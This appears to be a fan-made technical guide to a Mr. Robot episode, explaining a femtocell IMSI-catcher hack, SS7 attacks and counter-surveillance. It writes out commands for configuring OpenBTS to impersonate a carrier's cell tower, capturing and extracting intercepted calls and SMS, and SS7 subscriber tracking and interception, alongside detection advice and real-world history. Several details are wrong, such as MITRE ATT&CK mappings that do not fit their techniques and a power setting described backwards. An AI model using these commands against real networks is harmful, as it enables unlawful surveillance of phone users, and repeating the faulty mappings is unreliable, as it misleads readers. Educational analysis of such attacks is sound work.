# Season 3, Episode 7: eps3.6_fredrick+tanya.chk

## Episode Overview

The FBI femtocell hack reaches execution. The `.chk` file extension (checksum file) symbolizes verification and integrity checking -- appropriate for an episode where both the FBI and the Dark Army are checking and verifying each other's communications. The modified femtocell, planted in proximity to the FBI field office, begins intercepting cellular communications from agents working the E Corp investigation. This episode showcases the intersection of signals intelligence (SIGINT), cellular network exploitation, and the cat-and-mouse game between surveillance and counter-surveillance.

---

## Hacks & Techniques

### FBI Femtocell Hack Execution

The modified femtocell, prepared in Episode 3, is now deployed and operational. It functions as a rogue base station that forces FBI agents' phones to connect to it instead of legitimate cell towers.

**Deployment and activation sequence:**

```
1. Physical placement near FBI field office
2. Power on and network connection established
3. Femtocell broadcasts carrier-specific signal (matches target carrier)
4. Signal strength exceeds nearby legitimate towers
5. Target phones perform handover to femtocell
6. All voice, SMS, and data traffic now passes through attacker-controlled device
7. Traffic forwarded to legitimate network (transparent to users)
8. Copies of all traffic sent to collection server
```

**Femtocell operational status monitoring:**

```bash
# On the modified femtocell's root shell
# Monitor connected devices
watch -n 5 'cat /var/log/connected_ues.log'

# Output example:
# IMSI: 310260123456789 | IMEI: 353456789012345 | RSSI: -62dBm | Status: CONNECTED
# IMSI: 310260987654321 | IMEI: 356789012345678 | RSSI: -71dBm | Status: CONNECTED

# Monitor intercepted traffic volume
vnstat -l -i eth0

# Check femtocell service status
systemctl status femto-service
cat /var/log/femto-core.log | tail -50
```

### Modified Femtocell as IMSI Catcher

The femtocell functions as an **IMSI catcher** (also known as a cell-site simulator or colloquially as a "Stingray"):

**IMSI catcher capabilities:**

1. **Identity capture**: Collects IMSI (International Mobile Subscriber Identity) and IMEI (International Mobile Equipment Identity) from every phone that connects
2. **Location tracking**: Determines the physical location of target devices by signal strength and timing advance measurements
3. **Call interception**: Records voice calls routed through the device
4. **SMS interception**: Captures text messages in transit
5. **Data interception**: Monitors internet traffic from connected phones
6. **Downgrade attacks**: Can force phones to use weaker encryption (A5/1 instead of A5/3) or no encryption (A5/0) for easier interception

**Hardware platform -- OpenBTS and USRP SDR:**

The modified femtocell uses open-source software and software-defined radio hardware:

- **USRP (Universal Software Radio Peripheral)**: A software-defined radio platform from Ettus Research/National Instruments. The USRP B200 or B210 is commonly used for cellular research.
- **OpenBTS**: Open-source software that implements the GSM/UMTS base station protocol stack, turning a USRP into a functional cell tower.

```bash
# OpenBTS configuration for rogue base station
# (Educational reference - actual deployment is illegal)

# Install OpenBTS dependencies
sudo apt-get install uhd-host libuhd-dev gnuradio

# Configure OpenBTS identity to match target carrier
# Edit /etc/OpenBTS/OpenBTS.db
sqlite3 /etc/OpenBTS/OpenBTS.db \
    "UPDATE CONFIG SET VALUESTRING='310260' WHERE KEYSTRING='GSM.Identity.MCC.MNC'"
    # MCC 310 = USA, MNC 260 = T-Mobile (example)

sqlite3 /etc/OpenBTS/OpenBTS.db \
    "UPDATE CONFIG SET VALUESTRING='1234' WHERE KEYSTRING='GSM.Identity.LAC'"
    # LAC = Location Area Code (match nearby legitimate tower)

# Set transmit power (higher than legitimate towers)
sqlite3 /etc/OpenBTS/OpenBTS.db \
    "UPDATE CONFIG SET VALUESTRING='40' WHERE KEYSTRING='GSM.Radio.PowerManager.MaxAttenDB'"

# Start OpenBTS
sudo OpenBTS &
sudo sipauthserve &
sudo smqueue &
```

**Traffic capture with Wireshark:**

```bash
# Capture cellular traffic on the femtocell
tshark -i any -f "not port 22" -w /data/captures/fbi_intercept_$(date +%Y%m%d_%H%M%S).pcap

# Filter for voice traffic (RTP streams)
tshark -r capture.pcap -Y "rtp" -T fields -e rtp.ssrc -e rtp.timestamp

# Filter for SMS (using GSM MAP protocol)
tshark -r capture.pcap -Y "gsm_map.sm_RL_Data" -V

# Filter for HTTP traffic (unencrypted data)
tshark -r capture.pcap -Y "http.request" -T fields -e http.host -e http.request.uri

# Extract voice calls for playback
tshark -r capture.pcap -Y "rtp" -T fields -e rtp.payload | xxd -r -p > voice_raw.bin
# Decode based on codec (AMR, GSM-FR, etc.)
```

### SS7 Protocol Vulnerabilities

The show references vulnerabilities in **SS7 (Signaling System No. 7)**, the protocol suite used by telecommunications networks worldwide for call setup, routing, and management:

**SS7 vulnerability classes:**

1. **Location tracking**: SS7 allows any connected operator to query the location of any subscriber on any network worldwide
2. **Call interception**: An attacker with SS7 access can redirect calls through their own infrastructure for recording
3. **SMS interception**: SMS messages can be intercepted by registering a fake MSC (Mobile Switching Center) for the target subscriber
4. **Authentication bypass**: SS7 can be used to obtain session keys, enabling decryption of intercepted traffic

**SS7 attack flow for SMS interception:**

```
Attacker's SS7 Node
    |
    | SendRoutingInfoForSM (request subscriber location)
    v
Home Location Register (HLR)
    |
    | Returns: MSC address, IMSI
    v
Attacker's SS7 Node
    |
    | UpdateLocation (register fake MSC for target)
    v
HLR updates subscriber record
    |
    | Future SMS messages routed to attacker's fake MSC
    v
Attacker receives SMS meant for target
    |
    | Forward to real MSC (transparent interception)
    v
Target receives SMS (with delay)
```

```bash
# SS7 attack tools (research/educational context)
# SigPloit - SS7/GTP/Diameter vulnerability scanner

# Location tracking via SS7
python ss7_location.py --target-msisdn +15551234567 --attack-type psi
# PSI = Provide Subscriber Information

# SMS interception via SS7
python ss7_sms_intercept.py --target-msisdn +15551234567 --forward-to +15559876543

# Call interception via SS7
python ss7_call_redirect.py --target-msisdn +15551234567 --redirect-to +15559876543
```

### Man-in-the-Middle on Cellular Communications

The femtocell enables a classic man-in-the-middle (MITM) position on cellular communications:

**MITM architecture:**

```
[FBI Agent Phone]
    |
    | (Cellular radio - thinks it's connected to AT&T/Verizon)
    |
[Modified Femtocell - MITM Position]
    |--- [Traffic Logger] --> [Collection Server]
    |--- [Voice Decoder] --> [Call Recordings]
    |--- [SMS Extractor] --> [Message Database]
    |
    | (IPsec/GRE tunnel to carrier core network)
    |
[Legitimate Carrier Network]
    |
[Called Party / Internet]
```

**Encryption downgrade attack:**

```
4G/LTE (strong encryption) --> Force downgrade --> 3G UMTS --> Force downgrade --> 2G GSM
                                                                                    |
                                                                            Use A5/1 or A5/0
                                                                            (weak or no encryption)
                                                                                    |
                                                                            Plaintext interception
```

Modern 4G/LTE networks provide mutual authentication (both phone and network authenticate to each other), making MITM more difficult. However:

- The femtocell can selectively jam 4G signals, forcing phones to fall back to 3G or 2G
- 2G GSM provides only one-way authentication (phone authenticates to network, but network does not authenticate to phone)
- This allows the rogue base station to impersonate a legitimate tower without detection

### FBI Surveillance vs. Dark Army Counter-Surveillance (TSCM)

A parallel theme is the FBI's surveillance of Dark Army operatives versus the Dark Army's counter-surveillance measures:

**FBI surveillance techniques:**

- Physical surveillance teams with mobile and static observation posts
- Technical surveillance: phone taps (with FISA warrants), email monitoring
- Financial surveillance: tracking transactions and money flows
- Cooperative witnesses and informants (Darlene)

**Dark Army counter-surveillance (Technical Surveillance Countermeasures -- TSCM):**

- **RF sweeping**: Using spectrum analyzers to detect unauthorized radio transmissions (bugs, trackers)
- **Non-linear junction detection (NLJD)**: Devices that detect electronic components even when powered off
- **Infrared scanning**: Detecting heat signatures of active electronic devices hidden in rooms
- **Phone security**: Using Faraday bags, burner phones, and avoiding known-compromised communications
- **Surveillance Detection Routes (SDRs)**: Predetermined routes designed to expose physical surveillance through forced chokepoints, direction changes, and timing stops

```bash
# TSCM RF sweep using RTL-SDR
# Scan for suspicious RF emissions in a room
rtl_power -f 1M:6G:1M -i 10 -g 50 sweep_results.csv
# Analyze results for unexpected transmissions

# Wi-Fi surveillance detection
airodump-ng wlan0mon  # Look for unexpected access points or probe requests

# Bluetooth surveillance detection
hcitool scan          # Scan for nearby Bluetooth devices
btscanner             # Detailed Bluetooth device analysis

# Check for rogue cell towers using Android AIMSICD
# (Android IMSI-Catcher Detector - open source app)
```

---

## Tools Used

| Tool | Purpose |
|------|---------|
| **Modified femtocell** | Rogue base station / IMSI catcher |
| **USRP B200/B210** | Software-defined radio hardware platform |
| **OpenBTS** | Open-source GSM base station software |
| **Wireshark / tshark** | Network protocol analysis and packet capture |
| **SigPloit** | SS7 vulnerability testing framework |
| **RTL-SDR** | Low-cost SDR for RF spectrum analysis |
| **Faraday bags** | RF shielding for counter-surveillance |
| **Spectrum analyzer** | TSCM equipment for detecting surveillance devices |
| **airodump-ng** | Wi-Fi monitoring for surveillance detection |

---

## Commands Shown

```bash
# Femtocell monitoring
ssh root@femtocell-ip
tail -f /var/log/ue_connections.log
tcpdump -i any -w /data/capture_$(date +%s).pcap

# IMSI collection
sqlite3 /var/db/subscriber.db "SELECT imsi, imei, first_seen, last_seen FROM subscribers;"

# Voice call extraction from PCAP
tshark -r capture.pcap -Y rtp -T fields -e rtp.ssrc | sort -u
# For each unique SSRC (call stream):
tshark -r capture.pcap -Y "rtp.ssrc == 0x12345678" -T fields -e rtp.payload | \
    tr -d '\n' | xxd -r -p > call_stream.raw

# SS7 reconnaissance
# Query HLR for subscriber information
echo "MAP_SEND_ROUTING_INFO_FOR_SM MSISDN:+15551234567" | ss7_tool send

# TSCM sweep
rtl_power -f 100M:2.5G:500K -i 30 -g 40 rf_sweep.csv
gnuplot -e "set terminal png; set output 'rf_heatmap.png'; plot 'rf_sweep.csv' using 1:6 with lines"

# Counter-surveillance: detect nearby IMSI catchers
# Using SnoopSnitch (Android) or AIMSICD
# Look for indicators:
# - Unexpected cell tower changes
# - Encryption downgrade notifications
# - Unusual Location Area Code values
# - Silent/phantom SMS messages
```

---

## Real-World Parallels

### IMSI Catchers / Stingrays
- **Harris Corporation Stingray/Hailstorm**: The most widely known IMSI catcher used by US law enforcement. Over 75 agencies across 27 states have been documented using these devices. The FBI required non-disclosure agreements from police departments, preventing public oversight.
- **Carpenter v. United States (2018)**: Supreme Court ruled that accessing historical cell-site location information constitutes a search under the Fourth Amendment, requiring a warrant. This case has implications for IMSI catcher use.

### SS7 Vulnerabilities
- **60 Minutes Australia (2016)**: Demonstrated SS7 attacks on a live broadcast, tracking a senator's phone and intercepting his calls using only his phone number and SS7 access.
- **German researcher Karsten Nohl**: Presented SS7 vulnerabilities at 31C3 (2014), demonstrating that any party with SS7 access can track, intercept calls, and read SMS messages of any phone subscriber worldwide.
- **Bank account theft via SS7 (2017)**: German newspaper Suddeutsche Zeitung reported that criminals used SS7 attacks to intercept two-factor authentication SMS codes and steal money from bank accounts.
- **2019 Mozambique/Middle East SS7 attacks**: Researchers documented state-sponsored SS7 surveillance operations targeting individuals across multiple countries.

### OpenBTS and Rogue Base Stations
- **OpenBTS Project**: Open-source software that implements the GSM protocol stack. Originally developed for rural telecommunications but also used in security research to demonstrate base station vulnerabilities.
- **DEF CON demonstrations**: Multiple DEF CON presentations have demonstrated rogue base stations using USRP hardware and OpenBTS/OpenLTE/srsLTE software.
- **Chris Paget (DEF CON 18, 2010)**: Demonstrated a $1,500 IMSI catcher that could intercept GSM calls, one of the first public demonstrations of the technology.

### TSCM in Practice
- **US Embassy Havana "Sonic Attacks" (2016-2017)**: TSCM teams were deployed to the US Embassy in Havana to investigate mysterious symptoms reported by diplomats, demonstrating the real-world use of technical surveillance countermeasures.
- **NSA TAO (Tailored Access Operations)**: NSA's implant catalog (leaked by Shadow Brokers) included devices designed to be concealed in cables, USB connectors, and other everyday objects -- exactly the kind of devices TSCM sweeps aim to detect.
- **Russian Embassy bug discovery**: In 1945, the Soviet Union gifted a carved wooden seal to the US Ambassador containing a passive listening device (The Thing / Great Seal Bug) that went undetected for seven years -- a historical precedent for the surveillance/counter-surveillance dynamic shown in the episode.

## Tool Links

- [OpenBTS](http://openbts.org/) - Open-source GSM base station software
- [YateBTS](https://yatebts.com/) - Alternative GSM base station implementation
- [GNU Radio](https://www.gnuradio.org/) - Signal processing framework for SDR
- [USRP (Ettus Research)](https://www.ettus.com/) - Software-defined radio hardware
- [HackRF](https://greatscottgadgets.com/hackrf/) - SDR platform for RF spectrum analysis
- [Wireshark](https://www.wireshark.org/) - Network protocol analysis and cellular packet capture
- [Scapy](https://scapy.net/) - Network packet manipulation and analysis
- [Tor](https://www.torproject.org/) - Anonymity network for counter-surveillance

## MITRE ATT&CK Mapping

| Episode Technique | MITRE ATT&CK ID | Name | Link |
|---|---|---|---|
| Femtocell as IMSI catcher | T1200 | Hardware Additions | https://attack.mitre.org/techniques/T1200/ |
| Cellular communications interception | T1040 | Network Sniffing | https://attack.mitre.org/techniques/T1040/ |
| Man-in-the-Middle on cellular communications | T1557 | Adversary-in-the-Middle | https://attack.mitre.org/techniques/T1557/ |
| Cellular encryption downgrade | T1562 | Impair Defenses | https://attack.mitre.org/techniques/T1562/ |
| SS7 vulnerability exploitation | T1599 | Network Boundary Bridging | https://attack.mitre.org/techniques/T1599/ |
| SMS interception via SS7 | T1114 | Email Collection | https://attack.mitre.org/techniques/T1114/ |
| IMSI/IMEI capture | T1056 | Input Capture | https://attack.mitre.org/techniques/T1056/ |
| TSCM counter-surveillance | T1497 | Virtualization/Sandbox Evasion | https://attack.mitre.org/techniques/T1497/ |

## References and Further Reading

- **Harris Corporation Stingray/Hailstorm**: ACLU documentation on IMSI catcher use by over 75 law enforcement agencies in the US
- **Carpenter v. United States, 585 U.S. ___ (2018)**: Supreme Court decision on the warrant requirement for cell-site location data
- **Karsten Nohl (31C3, 2014)**: Presentation on SS7 vulnerabilities demonstrating tracking and interception of any cellular subscriber
- **60 Minutes Australia (2016)**: Live demonstration of SS7 attacks tracking and intercepting a senator's calls
- **Chris Paget (DEF CON 18, 2010)**: First public IMSI catcher demonstration for $1,500
- **NSA TAO Implant Catalog (Shadow Brokers leak)**: Catalog of surveillance devices concealed in everyday objects
- **The Great Seal Bug (1945)**: Soviet passive listening device that went undetected for seven years in the US embassy

## Search Tags

```
tags: [femtocell, IMSI-catcher, Stingray, SS7, OpenBTS, USRP, SDR, Wireshark, MITM, encryption-downgrade, TSCM, counter-surveillance, FBI, Dark-Army, cellular-interception]
season: 3
episode: 7
mitre: [T1200, T1040, T1557, T1562, T1599, T1114, T1056, T1497]
```
